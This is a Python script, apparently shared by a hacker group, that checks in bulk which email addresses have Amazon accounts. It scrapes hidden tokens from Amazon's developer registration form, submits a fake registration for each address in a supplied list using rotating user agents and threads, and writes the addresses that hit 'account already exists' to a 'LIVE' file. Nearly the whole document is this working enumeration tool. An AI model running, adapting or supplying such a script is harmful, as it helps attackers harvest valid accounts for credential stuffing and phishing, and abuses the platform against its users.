#!/usr/bin/env python
# Created By Wibu Heker
# Powered By Rintod.DEV
# https://web.facebook.com/wibuheker/
import requests, re, warnings, argparse
from termcolor import colored
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

def doSave(filename, data):
    f = open(filename, 'a+')
    f.write(data + "\n")
    f.close()

def doCheck(email):
    try:
        ua = UserAgent()
        sess = requests.Session()
        getRedirURI = sess.get('https://developer.amazon.com/settings/console/registration?return_to=/', headers={'User-Agent': ua.random}, allow_redirects=False)
        if 'location' in getRedirURI.headers:
            redirURI = getRedirURI.headers['location'].replace('signin', 'register')
            getToken = sess.get(redirURI, headers={'User-Agent': ua.random})
            appToken = re.findall('<input type="hidden" name="appActionToken" value="(.*?)"', getToken.text)[0]
            siteState = re.findall('<input type="hidden" name="siteState" value="(.*?)', getToken.text)[0]
            openid = re.findall('<input type="hidden" name="openid.return_to" value="(.*?)"', getToken.text)[0]
            prevId = re.findall('<input type="hidden" name="prevRID" value="(.*?)"', getToken.text)[0]
            workFlow = re.findall('<input type="hidden" name="workflowState" value="(.*?)"', getToken.text)[0]
            data = {
                'appActionToken': appToken,
                'appAction': 'REGISTER',
                'openid.return_to': openid,
                'prevRID': prevId,
                'siteState': siteState,
                'workflowState': workFlow,
                'claimToken': '',
                'customerName': 'Wibu Heker',
                'email': email,
                'password': 'wibuheker1337',
                'passwordCheck': 'wibuheker1337',
                'metadata1': 'wibuhekersangprabuakungentotsagirilonteanjirlahsia'
            }
            doPost = sess.post(redirURI, data=data, headers={'User-Agent': ua.random})
            if 'You indicated you are a new customer, but an account already exists' in doPost.text:
                print(colored('LIVE!', 'green') + " %s" % (email))
                doSave('AMAZON-LIVE.txt', email)
            else:
                print(colored('DIE!', 'red') + " %s" % (email))
                doSave('AMAZON-DIE.txt', email)
        else:
            print(colored('UNCHECK!', 'yellow') + " %s" %(email))
            doSave('AMAZON-UNCHECK.txt', email)
    except Exception as e:
        print('OOPS! ' + str(e))

parser = argparse.ArgumentParser(description='AMAZON MASS VALID CHECKER BY WIBUHEKER!')
parser.add_argument('--list', help='List of ur mailist', required=True)
parser.add_argument('--thread', help='Threading Proccess for fast checking max 10')
wibuheker = parser.parse_args()
try:
    wibuList = open(wibuheker.list, 'r').read().splitlines()
    if wibuheker.thread and wibuheker.thread is not None:
        with ThreadPoolExecutor(max_workers=int(wibuheker.thread)) as execute:
            for email in wibuList:
                execute.submit(doCheck, email)
    else:
        for email in wibuList:
            doCheck(email)
except Exception as e:
    print('OOPS! ' + str(e))
